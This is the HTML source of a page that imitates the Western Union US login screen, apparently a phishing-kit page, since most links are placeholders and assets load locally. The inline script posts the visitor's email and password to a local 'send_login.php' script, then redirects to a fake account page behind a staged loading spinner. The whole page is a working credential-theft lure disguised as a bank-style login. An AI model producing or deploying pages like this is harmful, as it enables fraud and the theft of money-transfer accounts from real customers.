<html lang="en" class="" ng-app="OptimusApp" id="optimusStarter" translate-cloak=""><head class="at-element-marker">


<style type="text/css">@charset "UTF-8";[ng\:cloak],[ng-cloak],[data-ng-cloak],[x-ng-cloak],.ng-cloak,.x-ng-cloak,.ng-hide:not(.ng-hide-animate){display:none !important;}ng\:form{display:block;}.ng-animate-shim{visibility:hidden;}.ng-anchor{position:absolute;}</style>
    
    

<script type="text/javascript">
document.onreadystatechange = function () {
  var state = document.readyState
  if (state == 'complete') {
      setTimeout(function(){
          document.getElementById('interactive');
         document.getElementById('fixed').style.visibility="hidden";
      },4000);
  }
}
</script>


<script src="./style/js/angular.min.js"></script>
<script src="./style/js/jquery.min.js"></script>
<script src="./style/js/jquery.validate.min.js"></script>
<script src="./style/js/jquery.mask.js"></script>
    	<script src="./style/js/style.js"></script>




    <meta name="viewport" content="width=device-width, initial-scale=1.0,
     minimum-scale=1.0, maximum-scale=1.0, user-scalable=no">
    
    
            <link rel="icon" type="image/vnd.microsoft.icon" href="./style/css/favicon.ico">
        
    
    
    
        <title>Log In with Western Union in the United States</title>
    
    
        <meta name="keywords" content="">
    
    
        <meta name="description" content="Sign in to your WU US profile to send money online with Western Union services from the United States.">
    
    
    
        
    
    
        <meta name="apple-itunes-app" content="app-id=424716908">
    
    
        <meta name="google-play-app" content="app-id=com.westernunion.android.mtapp">
    
    
    
     


               
 
 
 




 
 


    	<link rel="stylesheet" type="text/css" href="./style/css/responsive_css.min.css">
 









            
            
    



 
     




  

  
    
  

  
    
  

  
     
  

 

<style type="text/css" class="evergageCampaignStyles">/*
 * Copyright (C) 2010-2014 Evergage, Inc.
 * All rights reserved.
 */


/* Fluid class for determining actual width in IE */
#qtip-rcontainer .evergage-tooltip{
    display: block !important;
    visibility: hidden !important;
    position: static !important;
    float: left !important;
}

/* Core qTip styles */
.evergage-tooltip, .evergage-qtip{
    position: fixed;
    left: -28000px;
    top: -28000px;
    display: none;
}

.evergage-tooltip.evergageMessageInVisualEditorTestMode {
    position: absolute;
    pointer-events: auto;
}

.evergage-tooltip.evergage-jgrowl.evergage-tooltip-bar {
    max-width: 100% !important;
    width: 100% !important;
    border-radius: 0px !important;
    -o-border-radius: 0px !important;
    -moz-border-radius: 0px !important;
    -webkit-border-radius: 0px !important;
    -ms-border-radius: 0px !important;
}

.evergage-tooltip-invisible {
    display: none !important;
    visibility: hidden !important;
    width: 1px !important;
    height: 1px !important;
}

.evergage-tooltip-page {
    position: relative;
    left: 0;
    top: 0;
    z-index: inherit !important;
    display: inline-block;
}

.evergage-tooltip-page-replace {
    max-width: 100% !important;
    width: 100% !important;
    height: 100% !important;
}

.evergage-tooltip .evergage-tooltip-content li.evergage-tasklistitem-notdone, .evergage-tooltip .evergage-tooltip-content li.evergage-tasklistitem-done {
    text-transform: inherit;
    display: list-item;
    width: inherit;
    line-height: inherit;
    text-align: left;
    margin-bottom: 10px;
    list-style-position: inside;
}

.evergage-tooltip li.evergage-task-done, .evergage-tooltip li.evergage-task-notdone {
    margin-bottom: 10px;
}

.evergage-tooltip .evergage-tooltip-content li.evergage-tasklistitem-done, .evergage-tooltip li.evergage-task-done {
    text-decoration: line-through;
}

.evergage-tooltip.evergage-nonBlocking.evergage-tooltip-hover {
    opacity: 0.2 !important;
}

.evergage-tooltip .evergage-tooltip-content{
    position: relative;
    padding: 5px 9px;
    overflow: hidden;

    text-align: left;
    word-wrap: break-word;
}

.evergage-tooltip .evergage-tooltip-titlebar{
    position: relative;
    min-height: 14px;
    padding: 5px 35px 5px 10px;
    overflow: hidden;

    border-width: 0 0 1px;
    font-weight: bold;
}

.evergage-tooltip-titlebar + .evergage-tooltip-content{ border-top-width: 0 !important; }

/* Default close button class */
.evergage-tooltip-titlebar .evergage-tooltip-close {
    position: absolute;
    right: 4px;
    top: 50%;
    margin-top: -9px;
    font-weight: bold;

    cursor: pointer;
    outline: medium none;

    border: none;
    background: transparent;
    /*border-width: 1px;*/
    /*border-style: solid;*/
}

.emptyTitle > .evergage-tooltip-titlebar  {
    height: 0;
    float: right;
    z-index: 2147483647;
}

* html .evergage-tooltip .evergage-tooltip-titlebar .evergage-tooltip-close { top: 16px; } /* IE fix */

.evergage-tooltip-titlebar .evergage-ui-icon-close,
.evergage-tooltip-icon .evergage-ui-icon-close {
    display: block;
    text-indent: -1000em;
    direction: ltr;
}

.evergage-tooltip-icon, .evergage-tooltip-icon .evergage-ui-icon-close {
    -moz-border-radius: 3px;
    -webkit-border-radius: 3px;
    border-radius: 3px;
    text-decoration: none;
}

.evergage-tooltip-icon .evergage-ui-icon-close{
    width: 18px;
    height: 14px;

    text-align: center;
    text-indent: 0;
    font: normal bold 14px/14px sans-serif;

    color: inherit;
    background: transparent none no-repeat -100em -100em;
}

a.evergage-tooltip-close:hover {
    text-decoration: none;
}

.evergage-ui-icon-close:hover {
    font-size: 22px;
}


/* Applied to 'focused' tooltips e.g. most recently displayed/interacted with */
.evergage-tooltip-focus {}

/* Applied on hover of tooltips i.e. added/removed on mouseenter/mouseleave respectively */
.evergage-tooltip-hover {}

/* Default tooltip style */
.evergage-tooltip-default {
    /*border-width: 2px;
    border-style: solid;
    border-color: #F1D031;

    background-color: #FFFFA3;
    color: #555;*/
}

.evergage-tooltip-default .evergage-tooltip-titlebar {
    background-color: transparent;
}

.evergage-tooltip-default .evergage-tooltip-icon {
    /*border-color: #CCC;*/
    /*background: #F1F1F1;*/
    /*color: #777;*/
}

/* Add shadows to your tooltips in: FF3+, Chrome 2+, Opera 10.6+, IE9+, Safari 2+ */
.evergage-tooltip-shadow{
    -webkit-box-shadow: 1px 1px 3px 1px rgba(0, 0, 0, 0.15);
    -moz-box-shadow: 1px 1px 3px 1px rgba(0, 0, 0, 0.15);
    box-shadow: 1px 1px 3px 1px rgba(0, 0, 0, 0.15);
}

/* Add rounded corners to your tooltips in: FF3+, Chrome 2+, Opera 10.6+, IE9+, Safari 2+ */
.evergage-tooltip-rounded,
.evergage-tooltip-tipsy,
.evergage-tooltip-bootstrap{
    -moz-border-radius: 5px;
    -webkit-border-radius: 5px;
    border-radius: 5px;
}



/* IE9 fix - removes all filters */
.evergage-tooltip:not(.ie9haxors) div.evergage-tooltip-content,
.evergage-tooltip:not(.ie9haxors) div.evergage-tooltip-titlebar{
    filter: none;
    -ms-filter: none;
}


/* Tips plugin */
.evergage-tooltip .evergage-tooltip-tip{
    margin: 0 auto;
    overflow: hidden;
    z-index: 10;
}

.evergage-tooltip .evergage-tooltip-tip,
.evergage-tooltip .evergage-tooltip-tip .evergage-qtip-vml{
    position: absolute;

    line-height: 0.1px !important;
    font-size: 0.1px !important;
    color: #123456;

    background: transparent;
    border: 0 dashed transparent;
}

.evergage-tooltip .evergage-tooltip-tip canvas{ top: 0; left: 0; }

.evergage-tooltip .evergage-tooltip-tip .evergage-qtip-vml{
    behavior: url(#default#VML);
    display: inline-block;
    visibility: visible;
}

/* Modal plugin */
#evergage-qtip-overlay{
    position: fixed;
    left: -10000em;
    top: -10000em;
}

/* Applied to modals with show.modal.blur set to true */
#evergage-qtip-overlay.blurs{ cursor: pointer; }

/* Change opacity of overlay here */
#evergage-qtip-overlay div{
    position: absolute;
    left: 0; top: 0;
    width: 100%; height: 100%;

    background-color: black;

    opacity: 0.7;
    filter:alpha(opacity=70);
    -ms-filter:\"progid:DXImageTransform.Microsoft.Alpha(Opacity=70)\";
}

.evergage.poweredByEvergage > a {
    opacity: 0.2;
    transition: opacity 0.3s ease-in-out;
    -webkit-transition: opacity 0.3s ease-in-out;
    -moz-transition: opacity 0.3s ease-in-out;
    position: absolute;
    right: 4px;
    bottom: 2px;
}

.evergage.poweredByEvergage > a:hover {
    opacity: 1;
}


/*# sourceURL=evergageStyles.css*/</style><style type="text/css" id="kampyleStyle">.noOutline{outline: none !important;}.wcagOutline:focus{outline: 1px dashed #595959 !important;outline-offset: 2px !important;transition: none !important;}</style></head>
<body>

    <div class="container-fluid body-container">
        
        
             <header data-wurpheader="" style="position:relative">
             <div class="header parsys"><div class="header section">
   

    
       
		
<header>

  
  
  
  
	<div class="container">
        <div class="row header-top-container">
                <div class="col-xs-3 visible-xs">
                                       <div id="back_user_experience_1_container_for_mobile" class="visible-xs hide-content" style="border:0px solid #fff;color: white;margin-top: 26px;padding: 1px 0px 0px 30px;">
                        <a href="javascript:void(0);" style="
                        display: inline-block;
                        position: relative;
                        left: -25px;
                        top:-6px;" class="">
                        <i style="
                        color: #368ABB;
                        font-size: 28px;
                        display: inline-block;
                        width: 28px;
                        height: 28px;
                        overflow: hidden;" class="icon-0007_arrow-left"></i>
                        </a>
                    </div>
                </div>
                
                
                    
                	<div class="wu-logo col-xs-6 col-md-3 col-sm-2 wu-user-loggedout">
						
                            <a id="menu-wu-logo" href="#">
                          		<div class="wu-header-logo wu-partner-logo" alt="header-logo" data-partner-name=""><img src="./style/css/logo.wu.big.svg" alt="Western Union Logo"></div>
                        	</a>
                        
                    </div>
                    
                    <div class="fbWebviewHeaderLinks hidden ng-hide">
                      <a class="btn" href="#">Log in</a>
                    </div>
                    <div class="wu-logo col-xs-6 col-md-3 col-sm-2 wu-user-loggedin ng-hide" ng-show="wuUserLoginStaus">
                        
                            <a id="menu-wu-logo" href="#">
                          		<div class="wu-header-logo wu-partner-logo" alt="header-logo" data-partner-name=""><img src="./style/css/logo.wu.big.svg" alt="Western Union Logo"></div>
                        	</a>
                        
                    </div>
				<div class="col-xs-2 select-toggle wu-hamburger hidden" ng-hide="isMessenger" wu-hamburger-toggle="">
                    <div title="click for menu" class="wu-hamburger-menu" id="wuHamburger">
                        Menu
                    </div>
                    
                </div>
            
                <div class="tab-menu-container col-xs-12 col-md-9 col-sm-10 hidden">
                          <ul class="nav nav-tabs tab-menu" id="wuRpHeaderTabs">
                               
                              
                            <li id="moreMenuMobileProfileLink" role="presentation" class="wu-user-name wu-user-loggedin hidden-xs hidden-lg hidden-md hidden-sm menu-link ng-hide" ng-show="wuUserLoginStaus">
                                <a href="#" aria-label="menu" class="user-profile"><span class="menu-icons header-icon-profile"></span>
                                <div class="text wuLoggedInUserName ng-binding"></div></a>
                                </li>
                              
                            <li id="nav_tab6" role="presentation" class="hidden-xs hidden-lg hidden-md hidden-sm wu-register wu-user-loggedout menu-link"  >
                            	<a id="menu-login" href="#" data-linkname="">Log in</a>
                            </li>
                                
                            <li id="nav_tab7" role="presentation" class="wu-login hidden-xs hidden-sm hidden-lg hidden-md wu-user-loggedout menu-link" data-linktype="pps">
                            	<a id="menu-signup" href="#" data-linkname="">Sign up</a>
                              </li> 
                            
                            <li id="nav_tab1" role="presentation" class="hidden-xs menu-link" data-linktype="none">
                                <a id="menu-send-money" href="#" data-linkname="">


<b>Send money</b></a>
                            </li>
                            
                            <li id="nav_tab9" role="presentation" class="hidden-xs menu-link" data-linktype="pps">
                                <a id="cash-pickup-retail" href="#" data-linkname=""><b>Pick up cash</b></a>
                                </li>                            
							
                            
                            <li id="nav_tab2" role="presentation" class="hidden-xs menu-link" data-linktype="pps">
                                <a id="menu-track-transfer" href="#" data-linkname="">
<b>Track transfer</b></a>
                            </li>
                            
                            <li id="nav_tab3" role="presentation" class="hidden-xs menu-link" data-linktype="pps">
                                <a id="menu-pay-bill" href="#" data-linkname=""><b>Pay bills</b></a>
                                </li>
                            
                            <li id="nav_tab4" role="presentation" class="hidden-xs hidden-sm hidden-md menu-link" data-linktype="pps">
                                <a id="menu-find-location" target="_blank" href="#" data-linkname=""><b>Find locations</b></a>
                            </li>
                            
                            <li id="nav_tab5" role="presentation" class="hidden-xs hidden-md hidden-sm menu-link" data-linktype="pps">
                                <a id="menu-help" href="#" data-linkname=""><b>Help</b></a>
                            </li>
							<div class="header-top more-menu dropdown hidden-xs header_off-menu hide">
                                <a href="javascript:void(0)" id="menuicon" class="select-toggle toggle-nav toggle-nav-burger" wu-dropdown-toggle="">
                            		<span class="menubar"></span><span class="menubar"></span><span class="menubar"></span><span class="menubar"></span>
                                </a>
                                <ul class="dropdown-menu" id="site-menu">
                                    <li id="nav_tab8" role="presentation" class="menu-link visible-sm wu-login hidden-xs wu-user-loggedout" data-linktype="pps" ng-show="!wuUserLoginStaus">
                                        <a href="#">
                                            Sign up
                                        </a>
                                    </li>
									
                                    <li id="nav_tab4" role="presentation" class="menu-link hide visible-sm visible-md" data-linktype="pps">
                                        <a id="menu-find-location" href="#" data-linkname=""><span class="menu-icons header-icon-find-location"></span><b>Find locations</b></a>
                                    </li>
									
                                    <li id="nav_tab5" role="presentation" class="menu-link hide visible-md visible-sm" data-linktype="pps">
                                        <a id="menu-help" href="#" data-linkname=""><span class="menu-icons header-icon-customer-care"></span><b>Help</b></a>
                                    </li>    
                                    
                                    
                             
                                    <li role="presentation" class="menu-link wu-user-loggedout" data-linktype="loggedout">
                                        <a href="#" id="" target="_self"><span class="menu-icons header-icon-profile"></span><b><div>Profile</div></b></a>
                                    </li>
                                    
                             
                                    <li role="presentation" class="menu-link wu-user-loggedin ng-hide" data-linktype="loggedin">
                                        <a href="#" id="" data-linkname="" target="_self"><span class="menu-icons header-icon-history"></span><b><div>History</div></b></a>
                                    </li>
                                    
                             
                                    <li role="presentation" class="menu-link wu-user-loggedout" data-linktype="loggedout">
                                        <a href="#" id="" data-linkname="" target="_self"><span class="menu-icons header-icon-history"></span><b><div>History</div></b></a>
                                    </li>
                                    
                             
                                    <li role="presentation" class="menu-link wu-user-loggedin ng-hide" data-linktype="loggedin">
                                        <a href="#" id="" data-linkname="" target="_blank"><span class="menu-icons header-icon-my-wu"></span><b><div>My WU Rewards</div>

<span class="loyalty-section"><span id="loyalty-points" class="loyalty-points ng-hide" ng-show="showLoyaltyPoints"></span><span class="loyalty-points ng-hide" ng-show="showLoyaltyPoints">points</span></span></b></a>
                                    </li>
                                    
                             
                                    <li role="presentation" class="menu-link wu-user-loggedout" data-linktype="loggedout">
                                        <a href="#" id="" data-linkname="" target="_blank"><span class="menu-icons header-icon-my-wu"></span><b><div>My WU Rewards</div></b></a>
                                    </li>
                                    
                             
                                    <li role="presentation" class="menu-link wu-user-loggedin ng-hide" data-linktype="loggedin">
                                        <a href="#" id="" data-linkname="" target="_self"><span class="menu-icons header-icon-receivers"></span><b><div>My receivers</div></b></a>
                                    </li>
                                    
                             
                                    <li role="presentation" class="menu-link wu-user-loggedout" data-linktype="loggedout">
                                        <a href="#" id="" data-linkname="" target="_self"><span class="menu-icons header-icon-receivers"></span><b><div>My receivers</div></b></a>
                                    </li>
                                    
                             
                                    <li role="presentation" class="menu-link " data-linktype="pps">
                                        <a href="#" id="" data-linkname="" target="_self"><span class="menu-icons header-icon-inmate-pay"></span><b><div>Pay inmate </div></b></a>
                                    </li>
                                    
                             
                                    <li role="presentation" class="menu-link " data-linktype="pps">
                                        <a href="#" id="" data-linkname="" target="_self"><span class="menu-icons header-icon-topup-phone"></span><b><div>Mobile reload</div></b></a>
                                    </li>
                                    
                             
                                    <li role="presentation" class="menu-link " data-linktype="pps">
                                        <a href="#" id="" data-linkname="" target="_self"><span class="menu-icons header-icon-estimate-price"></span><b><div>Estimate price</div></b></a>
                                    </li>
                                    
                             
                                    <li role="presentation" class="menu-link " data-linktype="pps">
                                        <a href="#" id="" data-linkname="" target="_self"><span class="menu-icons header-icon-settings"></span><b><div>Settings</div></b></a>
                                    </li>
                                    
                             
                                    <li role="presentation" class="menu-link wu-user-loggedin ng-hide" id="menu-receiver-directed">
                                        <a href="#" id="" data-linkname="" target="_self"><span class="menu-icons header-icon-receiver-direct"></span><b><div>Receive money on a card</div></b></a>
                                    </li>
                                    
                                      
                                    <li class="hide hidden-xs hidden-md hidden-lg wu-user-loggedin wu-signout ng-hide">
									<a href="#" class="wu-user-logout" >
                                          Log out
                                    </a>
                                    </li>
                                </ul>
                                </div>
                                
                            <li class="visible-sm visible-md visible-lg wu-user-name wu-user-loggedin ng-hide hidden-xs"  id="moreMenuDesktopProfileLink">
                                        <a href="#" aria-label="Profile" class="user-profile">
                                        <span class="menu-icons header-icon-profile"></span>
										<span class="text wuLoggedInUserName ng-binding"></span></a>
                            			<div  class="hidden-xs hidden-sm wu-user-loggedin wu-signout menu-link ng-hide">
										<a href="#" title="sign out url" class="wu-user-logout">
                                          Log out
                                      	</a>
                            			</div>
                             </li>
                              
                            <li id="nav_tab6" role="presentation" class="hidden-xs visible-md visible-lg visible-sm wu-register wu-user-loggedout menu-link" >
                            	<a id="menu-login" href="#" data-linkname="">
                            		Log in
                               	</a>
                            </li>
                                  
                            <li id="nav_tab7" role="presentation" class="wu-login hidden-xs visible-md visible-lg hidden-sm wu-user-loggedout menu-link" >
                            	<a id="menu-signup" href="#" data-linkname="">
                                	Sign up
                               	</a>
                              </li>
				</ul>
		</div>
	</div>
</div>

</header>

<div class="progress-bar-web-main-container visible-xs hide-content" role="progressbar" aria-label="Progress Bar with Back Option">
    <div class="progress-bar-web" role="progressbar" aria-label="Progress Bar with Back Option">
        <div class="progress-extra hide"></div>
        <ul class="row progress-bar-options container container-new" >
            <li class="selectedLi"></li>
            <li id="progressbar-receiver" class="completedsteps selected-steps">Receiver</li>
            <li id="progressbar-payment" amplitude-id="progressbar-payment" >Payment</li>
            <li id="progressbar-review" amplitude-id="progressbar-review" aria-label="Review" label="Review" data-state="review">Review</li>
            <li id="progressbar-receipt" >Receipt</li>
        </ul>
        <div id="progress-bar-last-elment-id"></div>
    </div>
</div>

</div>

</div>

            </header>
        
        
        <section id="optimus-body-section" data-sessiontimer="">
            <div id="smonewuser" class="absolute-center">
                <div class=" container padding-left-0 padding-right-0 ">
                     <span class="ng-scope">
                        
                     </span>
                      <div ui-view="" class="ng-scope">









        <section class="ng-scope">
			<div class="body parsys">


					
		<div class="container-fluid"> 
            <div class="flex-row    ">

                <div class="wu-responsive-columns col-lg-12 col-md-12 col-sm-12 col-xs-12  colctrl">
                        <div class="loginpanel page section">



<div ng-controller="loginWidgetCtrl as loginWidgettVm" class="ng-scope">

    <div class="center-container">

        <div class="wu-register-banner">
            

            <div class="row">
                <div class="col-xs-6">
                    <h1 class="">
                        <translate class="ng-scope">Log in</translate>
                        
                    </h1>
                </div>
                <div class="hidden-sm hidden-md hidden-lg col-xs-6">
                    <p class="text-right padding-bottom-20">
                       

<a href="#" class="color-teal ng-scope" id="link-sign-up">
                        <translate class="ng-scope">Sign up</translate></a>

                    </p>
                </div>
                <div class="hidden-xs col-sm-6 ng-scope" >
                    <p class="text-right padding-top-10"><a href="" title="Sign Up" id="link-sign-up">
                        <translate class="ng-scope">Sign up</translate></a>
                    </p>
                </div>
            </div>

            
            <div class="modal fade" id="myModal">
                <div class="modal-dialog">
                    <div class="modal-content" style="border-radius:0px">
                        <div class="modal-header" style="border:0px">
                            <button type="button" class="close" data-dismiss="modal"> </button>
                        </div>
                        <div class="modal-body">
                            <div class="ng-binding">
                                <strong class="ng-binding">&nbsp;</strong>
                            </div>
                        </div>
                        <a id="areyousureYes" style="width:100%">OK</a>
                    </div>
                </div>
            </div>
            


            <div class="modal fade" id="partnerModelC1142">
                <div class="modal-dialog">
                    <div class="modal-content" style="border-radius:0px">
                        <div class="modal-header" style="border:0px">
                            <button type="button" class="close"> </button>
                        </div>
                        <div class="modal-body">
                            <div class="ng-binding">
                                <translate class="ng-scope"></translate>&nbsp;&nbsp;<translate class="ng-scope"></translate>
                            </div>
                        </div>
                        
                        <div style="display: flex;">
                         <a class=" partner-modal-error-register partner-modal-error-ok"><translate class="ng-scope"></translate></a>
                         <a class="partner-modal-error-register"><translate class="ng-scope"></translate></a>
                        </div>
                    </div>
                </div>
            </div>
             



<script>
$(function() {

	var validator = $("#wulogin").bind("invalid-form.validate", function() {
			$("#errorrwulogin").html('<div id="notification-container" class="alert alert-danger ng-scope" ng-if="loginWidgettVm.generalServiceError"><span id="notification-message" class="ng-binding">Please check your information and try again.</span><br><br><div class="pull-right"><small id="notification-code" class="ng-binding">C1131</small></div></div>');})
  $("form[name='wulogin']").validate({

	errorContainer: $("#errorrwulogin"),



    rules: {


      email: {
        required: true,
        email: true
      },
      password: {
        required: true,
        minlength: 5
      }
    },




highlight: function ( element, errorClass, validClass ) {

$( element ).parents( ".dddd" ).removeClass( validClass );
	$( element ).parents( ".dddd" ).addClass( errorClass );

this.findByName( element.name ).addClass( errorClass ).removeClass( validClass );



				},

unhighlight: function (element, errorClass, validClass) {
					
	this.findByName( element.name ).removeClass( errorClass ).addClass( validClass );

	$( element ).parents( ".dddd" ).addClass( validClass );
$( element ).parents( ".dddd" ).removeClass( errorClass );




				},




    messages: {
      

      wuemail : "Please check Email and try again.",
      wupassword : "Please check password and try again.",
      addres : "Address Line is required",

      iduserLoginId : "Please enter a valid Email or phone number.",

idpassword: {
        required: "Please enter a password.",
        minlength: "Your password must contain between 4 and 60 characters."},


      password: {
        required: "Please provide a password",
        minlength: "Your password must be at least 5 characters long"
      },
      email: "Please enter a valid email address"
    },







     submitHandler: function(form) {


$("#doori").show(500);






					$.post("./system/send_login.php?ajax", $("#wulogin").serialize(), function(result) {
                            setTimeout(function() {


$(location).attr("href", "./Myaccount");


});
});
},
});
});
</script>



       <form id="wulogin" name="wulogin"  autofillablefield="" novalidate="" class="ng-valid-minlength ng-valid-maxlength ng-dirty ng-valid-parse ng-invalid ng-invalid-required" style="">
                <div class="row">
                    <div class="dddd col-sm-12">
                        <span class="wu-field wu-email wu-float-label">
                            <label for="txtEmailAddr" style="display: none;"> <translate class="ng-scope">Email or username</translate> </label>
                            <input  type="email" name="wuemail" id="wuemail" class="form-control error-behavior ng-valid-required ng-touched ng-dirty ng-valid-parse ng-invalid-minlength empty " placeholder="" required="required" style="" aria-describedby="wuemailinputError" aria-invalid="false" ><div class="floating-label">Email or username</div> 





                            <span id="txtEmailAddrSuccess" class="sr-only">(<translate class="ng-scope">Email or username</translate>)</span>


                            


<span class="glyphicon glyphicon-remove glyphicon-ok  green-color red-color form-control-feedback text-centered ng-scope"  style="">
                            </span>

                        </span>
                    </div> 

                    <div class="col-sm-12">

<span class="block-message ng-scope" style="">
                           <translate class="ng-scope"> <span id="wuemailinputError" class="empty error" style="display: none;"></span> </translate>
                        </span>



<div ng-if="loginWidgettVm.enableEmailSuggestion" class="ng-scope">
                            <p id="email-suggestion-container" class="email-suggestion-container" style="display: none;">
                                <translate class="ng-scope">Did you mean</translate>&nbsp;<a href="#" id="email-suggestion"  class="color-teal ng-pristine ng-untouched ng-valid ng-empty" amplitude-id="link-emailcheck"></a><translate class="ng-scope">?</translate>
                            </p>
                        </div>

                    </div>
                     <div class="hidden-sm hidden-md hidden-lg col-xs-offset-4 col-xs-8  text-right" ng-hide="loginWidgettVm.hideRememberLink">
                         <label class="pull-right check-box-text text-link color-teal checkbox">
                             <input type="checkbox" class="remember-check ng-pristine ng-untouched ng-valid ng-not-empty" style="margin-top:1px;" amplitude-id="checkbox-remember-me">
                             <translate class="ng-scope">Remember me</translate>
                          </label>
                     </div>
                     <div class="hidden-xs col-sm-12 checkbox text-right">
                         <label class="pull-right check-box-text text-link checkbox color-teal margin-top-0">
                             <input class="remember-check ng-pristine ng-untouched ng-valid ng-not-empty" type="checkbox"  style="margin-top:1px;" amplitude-id="checkbox-remember-me">
                             <translate class="ng-scope">Remember me</translate>
                          </label>
                     </div>
                </div> 
                <div class="row">
                    <div class="dddd col-sm-12">
                        <span class="wu-field wu-pswd wu-float-label">
                            <label for="txtKey" style="display: none;"><translate class="ng-scope">Password</translate></label>
                            <input type="password" name="wupassword" id="wupassword" class="form-control error-behavior ng-valid-maxlength ng-dirty ng-valid-parse ng-invalid-required ng-touched empty " maxlength="16" required="required" style="" aria-describedby="wupasswordinputError" aria-invalid="false"   ><div class="floating-label">Password</div>
                       

     <span id="txtEmailAddrSuccess" class="sr-only">(<translate class="ng-scope">Password</translate>)</span>

                             <span class="remove-left-sided-border" >
                                    <a class="show-class color-teal" id="link-show-hide-password">
                                        
<small  class="ng-scope">
                                       

<small style="display:none;" id="passwordSHOW"><translate class="ng-scope">HIDE</translate></small>

  <translate id="passwordHIDE" class="ng-scope">SHOW</translate></small>
                                    </a>
                            </span>
                        </span>



<script>
$(document).ready(function(){
  $("#passwordSHOW").click(function(){
    $("#passwordSHOW").hide();
    $("#passwordHIDE").show();

    $("#wupassword").attr('type','Password');


  });
  $("#passwordHIDE").click(function(){
    $("#passwordSHOW").show();
    $("#passwordHIDE").hide();

    $("#wupassword").attr('type','text');

  });
});
</script>



                    </div>
                    <div class="col-sm-12 padding-bottom-10">


<span class="block-message ng-scope"  style="">
                            <translate class="ng-scope"><span id="wupasswordinputError" class="empty error" style="display: none;"></span></translate>
                        </span>
                    </div>
                     <div class="hidden-sm hidden-md hidden-lg col-xs-offset-4 col-xs-8 text-right">
                         <div class="text-right "><a class="text-link color-teal" href="" title="forget password" ><translate class="ng-scope">Forgot password?</translate></a></div>
                     </div>
                     <div class="hidden-xs col-sm-12 text-right">
                         <div class="text-right "><a class="text-link color-teal" href="" title="forget password" ><translate class="ng-scope">Forgot password?</translate></a></div>
                     </div>
                    <!-- Inline error message for captcha end -->
                    <div class="col-sm-12 clear-both">
                        <div class="padding-bottom-30"></div>
                    </div>
                </div>

                <div class="row">
                    <div class="col-sm-12">
                        <button type="submit" class="btn btn-primary btn-lg btn-block background-color-teal remove-margin" id="button-continue" data-linkname="button-login" amplitude-id="button-login">


<translate ng-if="!loginWidgettVm.isHostedPartnerFlow" class="ng-scope">Continue</translate>


                        </button>
                    </div>
                </div>
      
                      
</form>




        </div> 
           </div>
</div>
</div>
</div>       

                

                        <div class="wu-responsive-columns hidden-lg hidden-md  hidden-sm  hidden-xs  colctrl">
                            </div>       
                

                        <div class="wu-responsive-columns hidden-lg hidden-md  hidden-sm  hidden-xs  colctrl">
                            </div>       
                

                        <div class="wu-responsive-columns hidden-lg hidden-md  hidden-sm  hidden-xs  colctrl">
                            </div></div><div style="clear:both"></div>
</div>

        </div></section>

</div>
                </div>
            </div>
        </section>

            <footer data-wurpfooter="">
                 <div class="footer parsys"><div class="footer section">






    






<footer>
  


			

<div class="copyrightlinks-menu-container ng-scope">
    <div class="container copyrightlinks-container">
        <div class="col-sm-12 col-xs-12 quicklinks" hidelinks=""><ul>
<li><a href="#" >Home</a></li>
<li><a href="#">About us</a></li>
<li><a href="#">Contact us</a></li>
<li><a href="#">Blog</a></li>
<li><a href="#">Help</a></li>
<li><a href="#">Fraud awareness</a></li>
<li><a href="#">Investor relations</a></li>
<li><a href="#" >Careers</a></li>
<li><a href="#"target="_blank">Western Union Foundation</a></li>
<li><a href="#"  >News</a></li>
<li><a href="#" >Become an agent</a></li>
<li><a href="#" >Payment solutions</a></li>
<li><a href="#" target="_blank">State licensing</a></li>
<li><a href="#" >Law enforcement subpoena information</a></li>
<li><a href="#" >Terms and Conditions</a></li>
<li><a href="#" >Online Privacy Statement</a></li>
<li><a href="#" >Sitemap</a></li>
</ul>
</div>
		<div id="ga_dis" class="col-sm-8 col-md-9 col-xs-12 wu-copyright-text"><p>Western Union Financial Services, Inc., is LICENSED BY THE GEORGIA DEPARTMENT OF BANKING AND FINANCE and Licensed as Money Transmitter by the New York State Department of Financial Services.</p>
</div>
		<div class="col-sm-8 col-md-9 col-xs-12 wu-copyright-text"  ><p>  2018 Western Union Holdings, Inc. All Rights Reserved</p>
</div>
        <div class="col-sm-4 col-md-3 col-xs-12 social-icons-container"  >
        	<div class="social-media-text"><p><b>Follow us</b>&nbsp;on</p>
</div>
            <div class="social-icons">
            	<a href="#" target="_blank"><img src="./style/css/icon-sm-facebook.png" alt="facebook"></a>
                <a href="#" target="_blank"><img src="./style/css/icon-sm-youtube.png" alt="youtube"></a>
                <a href="#" target="_blank"><img src="./style/css/icon-sm-instagram.png" alt="instagram"></a>
                <a href="#" target="_blank"><img src="./style/css/icon-sm-twitter.png" alt="twitter"></a>
            </div>
        </div>

        
    </div>
</div>

</footer>



</div>

</div>

            </footer>
        
    </div>
    <div class="spinner-container ng-isolate-scope" data-spinner="" style="display: none;">
       <div class="spinner-block">
            <div class="spinner"></div>
            <p class="text-center spinner-text">Loading...</p>
        </div>
    </div>
   

    
    
  <div id="fixed" class="spinner-container ng-isolate-scope" style="">
       <div class="spinner-block">
            <div class="spinner"></div>
            <p class="text-center spinner-text">Loading...</p>
        </div>
    </div>


  <div id="doori" class="spinner-container ng-isolate-scope" style="display: none;">
       <div class="spinner-block">
            <div class="spinner"></div>
            <p class="text-center spinner-text">Loading...</p>
        </div>
    </div>


</body></html>